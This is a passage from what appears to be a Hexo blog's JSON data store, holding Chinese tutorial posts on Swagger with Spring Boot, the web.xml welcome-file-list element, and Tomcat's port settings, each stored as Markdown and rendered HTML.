*/\n\t    @Bean\n\t    public Docket createRestApi() {\n\t        return new Docket(DocumentationType.SWAGGER_2)\n\t                .apiInfo(apiInfo()).useDefaultResponseMessages(false)\n\t                .select()\n\t                .paths(PathSelectors.any())\n\t                .build();\n\t    }\n\t\n\t    /**\n\t     * api 文档信息对象，主要是文档标题相关的信息\n\t     *\n\t     * @return 文档信息对象\n\t     */\n\t    private ApiInfo apiInfo() {\n\t        return new ApiInfoBuilder()\n\t                .title(\"Spring Boot中使用Swagger2构建RESTful APIs\")\n\t                .description(\"更多Spring Boot相关文章请关注：http://blog.didispace.com/\")\n\t                .termsOfServiceUrl(\"http://blog.didispace.com/\")\n\t                .contact(\"Murphy's BLOG\")\n\t                .version(\"1.0.0.0\")\n\t                .build();\n\t    }\n\t}\n\n代码解释： \nApiInfo 这个对象是用来生成文档相关信息的，通过这个对象可以构建出文档标题、描述、版本等信息；\ncreateRestApi() 这个方法是进行Docket创建的；\nDocket 这个对象是用来渲染整个API文档的对象，这个对象通过@Bean注解注册到了Spring容器中，Swagger会自动加载该对象进行文档构建。\n\n** 使用Swagger注解： **\n\n\tpackage com.example.swagger.controller;\n\t\n\timport io.swagger.annotations.*;\n\timport org.springframework.web.bind.annotation.*;\n\t\n\t/**\n\t * Description: swagger controller test\n\t *\n\t * @author Jiankun.Zhangsun 2018/1/2 15:40\n\t */\n\t@Api(value = \"petApi\", description = \"pet api description\")\n\t@RestController\n\tpublic class PetApi {\n\t    @ApiOperation(value = \"get city by state\", notes = \"Get city by state\", \n\t            responseContainer = \"container\",\n\t            httpMethod = \"get\",\n\t\t\t\tcode = 304, \n\t            hidden = false, \n\t            produces = \"application/json;charset=utf-8\",\n\t            response = Pet.class, \n\t            tags = {\"user\", \"person\", \"pet\"})\n\t    @ApiResponses(value = {@ApiResponse(code = 405, message = \"Invalid input\", response = Pet.class) })\n\t    @RequestMapping(value = \"/pet\", method = RequestMethod.GET)\n\t    public Pet getPet(@ApiParam(value = \"param introduction\", name = \"name\", required = true) @RequestBody Pet p) {\n\t        Pet pet = new Pet();\n\t        pet.setName(p.getName());\n\t        pet.setAge(p.getAge());\n\t        return pet;\n\t    }\n\t}\n\n代码解释：\n@Api(value, description)\n\n\t类级别的注解，用于标识这是一个Api文档类，\n\tvalue： 表示Api文档名称，\n\tdescription： 用于简单的描述该Api文档。\n@ApiOperation(value，notes，response，tags，hidden，httpMethod，consumer...)， \n\n\tvalue：api功能描述， \n\tnotes: api功能的详细描述 \n\tresponse: 返回值类型的定义，class类型\n\ttags: api分类的管理，是一个字符串数组对象，每个值对应一个标签目录，没有就会新建一个，有了就直接进行分类\n\thidden: 是否隐藏该Api，默认为false， \n\thttpMethod: 请求方式\n\tconsumer: 接收的请求头信息\n\tproduces： 生产的请求头信息\n\n@ApiParam(value, name, required)\n\n\tvalue: 参数说明\n\tname: 参数名称\n\trequired: 是否必传\n\n** 访问API文档查看效果： **\n\n本地访问路径：http://localhost:8081/swagger-ui.html#/ 即可查看生成的效果。\n\n\n\n\n\n\n\n\n\n\n[1]: https://swagger.io/\n\n\n","slug":"springboot集成swagger注解入门","published":1,"updated":"2018-01-04T08:57:10.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tws002qmfahcjwjllpw","content":"<h4 id=\"Swagger简介-THE-WORLD’S-MOST-POPULAR-API-TOOLING\"><a href=\"#Swagger简介-THE-WORLD’S-MOST-POPULAR-API-TOOLING\" class=\"headerlink\" title=\"Swagger简介 THE WORLD’S MOST POPULAR API TOOLING\"></a><a href=\"https://swagger.io/\" target=\"_blank\" rel=\"noopener\">Swagger</a>简介 THE WORLD’S MOST POPULAR API TOOLING</h4><p>Swagger is the world’s largest framework of API developer tools for the OpenAPI Specification(OAS), enabling development across the entire API lifecycle, from design and documentation, to test and deployment.</p>\n<h4 id=\"Swagger的作用\"><a href=\"#Swagger的作用\" class=\"headerlink\" title=\"Swagger的作用:\"></a>Swagger的作用:</h4><p>Swagger是一款RESTFUL接口的文档在线自动生成框架，该框架可以自动生成接口文档，也可以进行接口测试，生成mock数据等。通过使用该框架可以快速、动态的更新和管理API，方便前、后台协同开发，提高开发效率，减少开发过程中一些人为的误差。    Swagger让部署管理和使用功能强大的API从未如此简单。</p>\n<h4 id=\"SpringBoot-集成Swagger步骤\"><a href=\"#SpringBoot-集成Swagger步骤\" class=\"headerlink\" title=\"SpringBoot 集成Swagger步骤:\"></a>SpringBoot 集成Swagger步骤:</h4><ol>\n<li><p>引入maven坐标配置</p>\n</li>\n<li><p>建立Swagger配置</p>\n</li>\n<li><p>使用Swagger注解</p>\n</li>\n<li><p>访问API文档查看效果</p>\n</li>\n</ol>\n<p><strong>引入maven坐标：</strong></p>\n<pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;io.springfox&lt;/groupId&gt;\n    &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;\n    &lt;version&gt;${springfox-version}&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;io.springfox&lt;/groupId&gt;\n    &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;\n    &lt;version&gt;${springfox-version}&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;joda-time&lt;/groupId&gt;\n    &lt;artifactId&gt;joda-time&lt;/artifactId&gt;\n    &lt;version&gt;2.9.9&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre><p><strong> 建立Swagger配置类： </strong></p>\n<pre><code>package com.example.swagger.config;\n\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport springfox.documentation.builders.ApiInfoBuilder;\nimport springfox.documentation.builders.PathSelectors;\nimport springfox.documentation.service.ApiInfo;\nimport springfox.documentation.spi.DocumentationType;\nimport springfox.documentation.spring.web.plugins.Docket;\nimport springfox.documentation.swagger2.annotations.EnableSwagger2;\n\n/**\n * Description: swagger配置类，通过Configuration注解让spring容器自动加载该类\n *\n * @author Jiankun.Zhangsun 2018/1/2 15:13\n */\n@Configuration\n@EnableSwagger2\npublic class SwaggerConfig {\n\n    /**\n     * 将返回值当作一个bean注入到容器中\n     *\n     * @return api文档对象\n     */\n    @Bean\n    public Docket createRestApi() {\n        return new Docket(DocumentationType.SWAGGER_2)\n                .apiInfo(apiInfo()).useDefaultResponseMessages(false)\n                .select()\n                .paths(PathSelectors.any())\n                .build();\n    }\n\n    /**\n     * api 文档信息对象，主要是文档标题相关的信息\n     *\n     * @return 文档信息对象\n     */\n    private ApiInfo apiInfo() {\n        return new ApiInfoBuilder()\n                .title(&quot;Spring Boot中使用Swagger2构建RESTful APIs&quot;)\n                .description(&quot;更多Spring Boot相关文章请关注：http://blog.didispace.com/&quot;)\n                .termsOfServiceUrl(&quot;http://blog.didispace.com/&quot;)\n                .contact(&quot;Murphy&apos;s BLOG&quot;)\n                .version(&quot;1.0.0.0&quot;)\n                .build();\n    }\n}\n</code></pre><p>代码解释：<br>ApiInfo 这个对象是用来生成文档相关信息的，通过这个对象可以构建出文档标题、描述、版本等信息；<br>createRestApi() 这个方法是进行Docket创建的；<br>Docket 这个对象是用来渲染整个API文档的对象，这个对象通过@Bean注解注册到了Spring容器中，Swagger会自动加载该对象进行文档构建。</p>\n<p><strong> 使用Swagger注解： </strong></p>\n<pre><code>package com.example.swagger.controller;\n\nimport io.swagger.annotations.*;\nimport org.springframework.web.bind.annotation.*;\n\n/**\n * Description: swagger controller test\n *\n * @author Jiankun.Zhangsun 2018/1/2 15:40\n */\n@Api(value = &quot;petApi&quot;, description = &quot;pet api description&quot;)\n@RestController\npublic class PetApi {\n    @ApiOperation(value = &quot;get city by state&quot;, notes = &quot;Get city by state&quot;, \n            responseContainer = &quot;container&quot;,\n            httpMethod = &quot;get&quot;,\n            code = 304, \n            hidden = false, \n            produces = &quot;application/json;charset=utf-8&quot;,\n            response = Pet.class, \n            tags = {&quot;user&quot;, &quot;person&quot;, &quot;pet&quot;})\n    @ApiResponses(value = {@ApiResponse(code = 405, message = &quot;Invalid input&quot;, response = Pet.class) })\n    @RequestMapping(value = &quot;/pet&quot;, method = RequestMethod.GET)\n    public Pet getPet(@ApiParam(value = &quot;param introduction&quot;, name = &quot;name&quot;, required = true) @RequestBody Pet p) {\n        Pet pet = new Pet();\n        pet.setName(p.getName());\n        pet.setAge(p.getAge());\n        return pet;\n    }\n}\n</code></pre><p>代码解释：<br>@Api(value, description)</p>\n<pre><code>类级别的注解，用于标识这是一个Api文档类，\nvalue： 表示Api文档名称，\ndescription： 用于简单的描述该Api文档。\n</code></pre><p>@ApiOperation(value，notes，response，tags，hidden，httpMethod，consumer…)， </p>\n<pre><code>value：api功能描述， \nnotes: api功能的详细描述 \nresponse: 返回值类型的定义，class类型\ntags: api分类的管理，是一个字符串数组对象，每个值对应一个标签目录，没有就会新建一个，有了就直接进行分类\nhidden: 是否隐藏该Api，默认为false， \nhttpMethod: 请求方式\nconsumer: 接收的请求头信息\nproduces： 生产的请求头信息\n</code></pre><p>@ApiParam(value, name, required)</p>\n<pre><code>value: 参数说明\nname: 参数名称\nrequired: 是否必传\n</code></pre><p><strong> 访问API文档查看效果： </strong></p>\n<p>本地访问路径：<a href=\"http://localhost:8081/swagger-ui.html#/\" target=\"_blank\" rel=\"noopener\">http://localhost:8081/swagger-ui.html#/</a> 即可查看生成的效果。</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"Swagger简介-THE-WORLD’S-MOST-POPULAR-API-TOOLING\"><a href=\"#Swagger简介-THE-WORLD’S-MOST-POPULAR-API-TOOLING\" class=\"headerlink\" title=\"Swagger简介 THE WORLD’S MOST POPULAR API TOOLING\"></a><a href=\"https://swagger.io/\" target=\"_blank\" rel=\"noopener\">Swagger</a>简介 THE WORLD’S MOST POPULAR API TOOLING</h4><p>Swagger is the world’s largest framework of API developer tools for the OpenAPI Specification(OAS), enabling development across the entire API lifecycle, from design and documentation, to test and deployment.</p>\n<h4 id=\"Swagger的作用\"><a href=\"#Swagger的作用\" class=\"headerlink\" title=\"Swagger的作用:\"></a>Swagger的作用:</h4><p>Swagger是一款RESTFUL接口的文档在线自动生成框架，该框架可以自动生成接口文档，也可以进行接口测试，生成mock数据等。通过使用该框架可以快速、动态的更新和管理API，方便前、后台协同开发，提高开发效率，减少开发过程中一些人为的误差。    Swagger让部署管理和使用功能强大的API从未如此简单。</p>\n<h4 id=\"SpringBoot-集成Swagger步骤\"><a href=\"#SpringBoot-集成Swagger步骤\" class=\"headerlink\" title=\"SpringBoot 集成Swagger步骤:\"></a>SpringBoot 集成Swagger步骤:</h4><ol>\n<li><p>引入maven坐标配置</p>\n</li>\n<li><p>建立Swagger配置</p>\n</li>\n<li><p>使用Swagger注解</p>\n</li>\n<li><p>访问API文档查看效果</p>\n</li>\n</ol>\n<p><strong>引入maven坐标：</strong></p>\n<pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;io.springfox&lt;/groupId&gt;\n    &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;\n    &lt;version&gt;${springfox-version}&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;io.springfox&lt;/groupId&gt;\n    &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;\n    &lt;version&gt;${springfox-version}&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;joda-time&lt;/groupId&gt;\n    &lt;artifactId&gt;joda-time&lt;/artifactId&gt;\n    &lt;version&gt;2.9.9&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre><p><strong> 建立Swagger配置类： </strong></p>\n<pre><code>package com.example.swagger.config;\n\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport springfox.documentation.builders.ApiInfoBuilder;\nimport springfox.documentation.builders.PathSelectors;\nimport springfox.documentation.service.ApiInfo;\nimport springfox.documentation.spi.DocumentationType;\nimport springfox.documentation.spring.web.plugins.Docket;\nimport springfox.documentation.swagger2.annotations.EnableSwagger2;\n\n/**\n * Description: swagger配置类，通过Configuration注解让spring容器自动加载该类\n *\n * @author Jiankun.Zhangsun 2018/1/2 15:13\n */\n@Configuration\n@EnableSwagger2\npublic class SwaggerConfig {\n\n    /**\n     * 将返回值当作一个bean注入到容器中\n     *\n     * @return api文档对象\n     */\n    @Bean\n    public Docket createRestApi() {\n        return new Docket(DocumentationType.SWAGGER_2)\n                .apiInfo(apiInfo()).useDefaultResponseMessages(false)\n                .select()\n                .paths(PathSelectors.any())\n                .build();\n    }\n\n    /**\n     * api 文档信息对象，主要是文档标题相关的信息\n     *\n     * @return 文档信息对象\n     */\n    private ApiInfo apiInfo() {\n        return new ApiInfoBuilder()\n                .title(&quot;Spring Boot中使用Swagger2构建RESTful APIs&quot;)\n                .description(&quot;更多Spring Boot相关文章请关注：http://blog.didispace.com/&quot;)\n                .termsOfServiceUrl(&quot;http://blog.didispace.com/&quot;)\n                .contact(&quot;Murphy&apos;s BLOG&quot;)\n                .version(&quot;1.0.0.0&quot;)\n                .build();\n    }\n}\n</code></pre><p>代码解释：<br>ApiInfo 这个对象是用来生成文档相关信息的，通过这个对象可以构建出文档标题、描述、版本等信息；<br>createRestApi() 这个方法是进行Docket创建的；<br>Docket 这个对象是用来渲染整个API文档的对象，这个对象通过@Bean注解注册到了Spring容器中，Swagger会自动加载该对象进行文档构建。</p>\n<p><strong> 使用Swagger注解： </strong></p>\n<pre><code>package com.example.swagger.controller;\n\nimport io.swagger.annotations.*;\nimport org.springframework.web.bind.annotation.*;\n\n/**\n * Description: swagger controller test\n *\n * @author Jiankun.Zhangsun 2018/1/2 15:40\n */\n@Api(value = &quot;petApi&quot;, description = &quot;pet api description&quot;)\n@RestController\npublic class PetApi {\n    @ApiOperation(value = &quot;get city by state&quot;, notes = &quot;Get city by state&quot;, \n            responseContainer = &quot;container&quot;,\n            httpMethod = &quot;get&quot;,\n            code = 304, \n            hidden = false, \n            produces = &quot;application/json;charset=utf-8&quot;,\n            response = Pet.class, \n            tags = {&quot;user&quot;, &quot;person&quot;, &quot;pet&quot;})\n    @ApiResponses(value = {@ApiResponse(code = 405, message = &quot;Invalid input&quot;, response = Pet.class) })\n    @RequestMapping(value = &quot;/pet&quot;, method = RequestMethod.GET)\n    public Pet getPet(@ApiParam(value = &quot;param introduction&quot;, name = &quot;name&quot;, required = true) @RequestBody Pet p) {\n        Pet pet = new Pet();\n        pet.setName(p.getName());\n        pet.setAge(p.getAge());\n        return pet;\n    }\n}\n</code></pre><p>代码解释：<br>@Api(value, description)</p>\n<pre><code>类级别的注解，用于标识这是一个Api文档类，\nvalue： 表示Api文档名称，\ndescription： 用于简单的描述该Api文档。\n</code></pre><p>@ApiOperation(value，notes，response，tags，hidden，httpMethod，consumer…)， </p>\n<pre><code>value：api功能描述， \nnotes: api功能的详细描述 \nresponse: 返回值类型的定义，class类型\ntags: api分类的管理，是一个字符串数组对象，每个值对应一个标签目录，没有就会新建一个，有了就直接进行分类\nhidden: 是否隐藏该Api，默认为false， \nhttpMethod: 请求方式\nconsumer: 接收的请求头信息\nproduces： 生产的请求头信息\n</code></pre><p>@ApiParam(value, name, required)</p>\n<pre><code>value: 参数说明\nname: 参数名称\nrequired: 是否必传\n</code></pre><p><strong> 访问API文档查看效果： </strong></p>\n<p>本地访问路径：<a href=\"http://localhost:8081/swagger-ui.html#/\" target=\"_blank\" rel=\"noopener\">http://localhost:8081/swagger-ui.html#/</a> 即可查看生成的效果。</p>\n"},{"title":"welcome-file-list元素","date":"2015-07-30T09:44:20.000Z","_content":"#### welcome-file-list元素\n&emsp;&emsp;**welcome-file-list**元素是一个计算机名词，当用户在浏览器中输入的URL不包含某个servlet名或JSP页面时，welcome-file-list元素可指定显示的默认文件。\n\n目录\n\n1. 介绍\n2. 案例\n\n**介绍编辑**\n\n当用户在浏览器中输入的URL不包含某个servlet名或JSP页面时，welcome-file-list元素可指定显示的默认文件。\n\n``` \n<!ELEMENT welcome-file-list (welcome-file+)>\n<!ELEMENT welcome-file (#PCDATA)>\n```\n\n**案例编辑**\n\n举个例子说明，假设用户在浏览器的地址框中输入 http://www.mycompany.com/appName/ 等地址。如果在Web应用的部署描述符中没有指定welcome-file-list元素，用户就会看到一个权限错误消息，或者是应用目录下的文件和目录列表。如果定义了welcome-file-list元素，用户就能看到由该元素指定的具体文件。\n**welcome-file**子元素用于指定默认文件的名称。welcome-file-list元素可以包含一个或多个welcome-file子元素。如果在第一个welcome-file元素中没有找到指定的文件，Web容器就会尝试显示第二个，以此类推。\n下面是一个包含welcome-file-list元素的部署描述符。该元素包含两个welcome-file元素：第一个指定应用目录中的main.html文件，第二个定义jsp目录下的welcom.jsp文件，jsp目录也在应用目录下。\n```\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE web-app\nPUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"\n\"http://java.sun.com/dtd/web-app_2_3.dtd\">\n<web-app>\n<welcome-file-list>\n<welcome-file>main.html</welcome-file>\n<welcome-file>jsp/welcome.jsp</welcome-file>\n</welcome-file-list>\n</web-app>\n```\n如果用户键入的URL不包含servlet名称、JSP页面或其他资源，则不会在应用目录中找到main.html文件，这时就会显示jsp目录下的welcome.jsp文件。","source":"_posts/welcome-file-list元素.md","raw":"---\ntitle: welcome-file-list元素\ndate: 2015-07-30 17:44:20\ntags: WEB\n---\n#### welcome-file-list元素\n&emsp;&emsp;**welcome-file-list**元素是一个计算机名词，当用户在浏览器中输入的URL不包含某个servlet名或JSP页面时，welcome-file-list元素可指定显示的默认文件。\n\n目录\n\n1. 介绍\n2. 案例\n\n**介绍编辑**\n\n当用户在浏览器中输入的URL不包含某个servlet名或JSP页面时，welcome-file-list元素可指定显示的默认文件。\n\n``` \n<!ELEMENT welcome-file-list (welcome-file+)>\n<!ELEMENT welcome-file (#PCDATA)>\n```\n\n**案例编辑**\n\n举个例子说明，假设用户在浏览器的地址框中输入 http://www.mycompany.com/appName/ 等地址。如果在Web应用的部署描述符中没有指定welcome-file-list元素，用户就会看到一个权限错误消息，或者是应用目录下的文件和目录列表。如果定义了welcome-file-list元素，用户就能看到由该元素指定的具体文件。\n**welcome-file**子元素用于指定默认文件的名称。welcome-file-list元素可以包含一个或多个welcome-file子元素。如果在第一个welcome-file元素中没有找到指定的文件，Web容器就会尝试显示第二个，以此类推。\n下面是一个包含welcome-file-list元素的部署描述符。该元素包含两个welcome-file元素：第一个指定应用目录中的main.html文件，第二个定义jsp目录下的welcom.jsp文件，jsp目录也在应用目录下。\n```\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE web-app\nPUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"\n\"http://java.sun.com/dtd/web-app_2_3.dtd\">\n<web-app>\n<welcome-file-list>\n<welcome-file>main.html</welcome-file>\n<welcome-file>jsp/welcome.jsp</welcome-file>\n</welcome-file-list>\n</web-app>\n```\n如果用户键入的URL不包含servlet名称、JSP页面或其他资源，则不会在应用目录中找到main.html文件，这时就会显示jsp目录下的welcome.jsp文件。","slug":"welcome-file-list元素","published":1,"updated":"2018-01-30T09:25:28.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twt002smfahafe9ebrf","content":"<h4 id=\"welcome-file-list元素\"><a href=\"#welcome-file-list元素\" class=\"headerlink\" title=\"welcome-file-list元素\"></a>welcome-file-list元素</h4><p>&emsp;&emsp;<strong>welcome-file-list</strong>元素是一个计算机名词，当用户在浏览器中输入的URL不包含某个servlet名或JSP页面时，welcome-file-list元素可指定显示的默认文件。</p>\n<p>目录</p>\n<ol>\n<li>介绍</li>\n<li>案例</li>\n</ol>\n<p><strong>介绍编辑</strong></p>\n<p>当用户在浏览器中输入的URL不包含某个servlet名或JSP页面时，welcome-file-list元素可指定显示的默认文件。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ELEMENT welcome-file-list (welcome-file+)&gt;</span><br><span class=\"line\">&lt;!ELEMENT welcome-file (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>案例编辑</strong></p>\n<p>举个例子说明，假设用户在浏览器的地址框中输入 <a href=\"http://www.mycompany.com/appName/\" target=\"_blank\" rel=\"noopener\">http://www.mycompany.com/appName/</a> 等地址。如果在Web应用的部署描述符中没有指定welcome-file-list元素，用户就会看到一个权限错误消息，或者是应用目录下的文件和目录列表。如果定义了welcome-file-list元素，用户就能看到由该元素指定的具体文件。<br><strong>welcome-file</strong>子元素用于指定默认文件的名称。welcome-file-list元素可以包含一个或多个welcome-file子元素。如果在第一个welcome-file元素中没有找到指定的文件，Web容器就会尝试显示第二个，以此类推。<br>下面是一个包含welcome-file-list元素的部署描述符。该元素包含两个welcome-file元素：第一个指定应用目录中的main.html文件，第二个定义jsp目录下的welcom.jsp文件，jsp目录也在应用目录下。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE web-app</span><br><span class=\"line\">PUBLIC &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span><br><span class=\"line\">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;&gt;</span><br><span class=\"line\">&lt;web-app&gt;</span><br><span class=\"line\">&lt;welcome-file-list&gt;</span><br><span class=\"line\">&lt;welcome-file&gt;main.html&lt;/welcome-file&gt;</span><br><span class=\"line\">&lt;welcome-file&gt;jsp/welcome.jsp&lt;/welcome-file&gt;</span><br><span class=\"line\">&lt;/welcome-file-list&gt;</span><br><span class=\"line\">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure></p>\n<p>如果用户键入的URL不包含servlet名称、JSP页面或其他资源，则不会在应用目录中找到main.html文件，这时就会显示jsp目录下的welcome.jsp文件。</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"welcome-file-list元素\"><a href=\"#welcome-file-list元素\" class=\"headerlink\" title=\"welcome-file-list元素\"></a>welcome-file-list元素</h4><p>&emsp;&emsp;<strong>welcome-file-list</strong>元素是一个计算机名词，当用户在浏览器中输入的URL不包含某个servlet名或JSP页面时，welcome-file-list元素可指定显示的默认文件。</p>\n<p>目录</p>\n<ol>\n<li>介绍</li>\n<li>案例</li>\n</ol>\n<p><strong>介绍编辑</strong></p>\n<p>当用户在浏览器中输入的URL不包含某个servlet名或JSP页面时，welcome-file-list元素可指定显示的默认文件。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ELEMENT welcome-file-list (welcome-file+)&gt;</span><br><span class=\"line\">&lt;!ELEMENT welcome-file (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>案例编辑</strong></p>\n<p>举个例子说明，假设用户在浏览器的地址框中输入 <a href=\"http://www.mycompany.com/appName/\" target=\"_blank\" rel=\"noopener\">http://www.mycompany.com/appName/</a> 等地址。如果在Web应用的部署描述符中没有指定welcome-file-list元素，用户就会看到一个权限错误消息，或者是应用目录下的文件和目录列表。如果定义了welcome-file-list元素，用户就能看到由该元素指定的具体文件。<br><strong>welcome-file</strong>子元素用于指定默认文件的名称。welcome-file-list元素可以包含一个或多个welcome-file子元素。如果在第一个welcome-file元素中没有找到指定的文件，Web容器就会尝试显示第二个，以此类推。<br>下面是一个包含welcome-file-list元素的部署描述符。该元素包含两个welcome-file元素：第一个指定应用目录中的main.html文件，第二个定义jsp目录下的welcom.jsp文件，jsp目录也在应用目录下。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE web-app</span><br><span class=\"line\">PUBLIC &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span><br><span class=\"line\">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;&gt;</span><br><span class=\"line\">&lt;web-app&gt;</span><br><span class=\"line\">&lt;welcome-file-list&gt;</span><br><span class=\"line\">&lt;welcome-file&gt;main.html&lt;/welcome-file&gt;</span><br><span class=\"line\">&lt;welcome-file&gt;jsp/welcome.jsp&lt;/welcome-file&gt;</span><br><span class=\"line\">&lt;/welcome-file-list&gt;</span><br><span class=\"line\">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure></p>\n<p>如果用户键入的URL不包含servlet名称、JSP页面或其他资源，则不会在应用目录中找到main.html文件，这时就会显示jsp目录下的welcome.jsp文件。</p>\n"},{"title":"Tomcat中的三个端口的含义","date":"2018-01-30T08:42:47.000Z","_content":"\n1. 服务器关闭监听端口：\n![](tomcat中的三个端口的含义/1.png)\n\n\t详解：\n\t\n\t\t　　port:指定一个端口，这个端口负责监听关闭Tomcat的请求\n\t\t　　当执行shutdown.sh的时候会向以上端口发送的关闭服务器的命令字符串\n\n2. 服务器请求监听端口：\n![](tomcat中的三个端口的含义/2.png)\n\n\t详解：\n\n\t\t　　port:服务器连接器的端口号,该连接器将在指定端口侦听来自客户端的请求。\n\t\t　　redirectPort:服务器正在处理http请求时收到了一个SSL传输请求后重定向的端口号。\n\t\t　　connectionTimeout:等待超时的时间数（以毫秒为单位）。\n\n3. AJP请求监听端口：\n![](tomcat中的三个端口的含义/3.png)\n\n\t详解：\n\t\n\t\t　　AJP协议访问端口（默认为8009端口） \n\t\t　　负责和其他的HTTP服务器建立连接。在把Tomcat与其他HTTP服务器集成时，就需要用到这个连接器。","source":"_posts/tomcat中的三个端口的含义.md","raw":"---\ntitle: 'Tomcat中的三个端口的含义'\ndate: 2018-01-30 16:42:47\ntags: Tomcat\n---\n\n1. 服务器关闭监听端口：\n![](tomcat中的三个端口的含义/1.png)\n\n\t详解：\n\t\n\t\t　　port:指定一个端口，这个端口负责监听关闭Tomcat的请求\n\t\t　　当执行shutdown.sh的时候会向以上端口发送的关闭服务器的命令字符串\n\n2. 服务器请求监听端口：\n![](tomcat中的三个端口的含义/2.png)\n\n\t详解：\n\n\t\t　　port:服务器连接器的端口号,该连接器将在指定端口侦听来自客户端的请求。\n\t\t　　redirectPort:服务器正在处理http请求时收到了一个SSL传输请求后重定向的端口号。\n\t\t　　connectionTimeout:等待超时的时间数（以毫秒为单位）。\n\n3. AJP请求监听端口：\n![](tomcat中的三个端口的含义/3.png)\n\n\t详解：\n\t\n\t\t　　AJP协议访问端口（默认为8009端口） \n\t\t　　负责和其他的HTTP服务器建立连接。在把Tomcat与其他HTTP服务器集成时，就需要用到这个连接器。","slug":"tomcat中的三个端口的含义","published":1,"updated":"2018-01-30T08:54:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twu002umfahsx4k5ena","content":"<ol>\n<li><p>服务器关闭监听端口：<br><img src=\"tomcat中的三个端口的含义/1.png\" alt=\"\"></p>\n<p> 详解：</p>\n<pre><code> 　　port:指定一个端口，这个端口负责监听关闭Tomcat的请求\n 　　当执行shutdown.sh的时候会向以上端口发送的关闭服务器的命令字符串\n</code></pre></li>\n<li><p>服务器请求监听端口：<br><img src=\"tomcat中的三个端口的含义/2.png\" alt=\"\"></p>\n<p> 详解：</p>\n<pre><code> 　　port:服务器连接器的端口号,该连接器将在指定端口侦听来自客户端的请求。\n 　　redirectPort:服务器正在处理http请求时收到了一个SSL传输请求后重定向的端口号。\n 　　connectionTimeout:等待超时的时间数（以毫秒为单位）。\n</code></pre></li>\n<li><p>AJP请求监听端口：<br><img src=\"tomcat中的三个端口的含义/3.png\" alt=\"\"></p>\n<p> 详解：</p>\n<pre><code> 　　AJP协议访问端口（默认为8009端口） \n 　　负责和其他的HTTP服务器建立连接。在把Tomcat与其他HTTP服务器集成时，就需要用到这个连接器。\n</code></pre></li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<ol>\n<li><p>服务器关闭监听端口：<br><img src=\"tomcat中的三个端口的含义/1.png\" alt=\"\"></p>\n<p> 详解：</p>\n<pre><code> 　　port:指定一个端口，这个端口负责监听关闭Tomcat的请求\n 　　当执行shutdown.sh的时候会向以上端口发送的关闭服务器的命令字符串\n</code></pre></li>\n<li><p>服务器请求监听端口：<br><img src=\"tomcat中的三个端口的含义/2.png\" alt=\"\"></p>\n<p> 详解：</p>\n<pre><code> 　　port:服务器连接器的端口号,该连接器将在指定端口侦听来自客户端的请求。\n 　　redirectPort:服务器正在处理http请求时收到了一个SSL传输请求后重定向的端口号。\n 　　connectionTimeout:等待超时的时间数（以毫秒为单位）。\n</code></pre></li>\n<li><p>AJP请求监听端口：<br><img src=\"tomcat中的三个端口的含义/3.png\" alt=\"\"></p>\n<p> 详解：</p>\n<pre><code> 　　AJP协议访问端口（默认为8009端口） \n 　　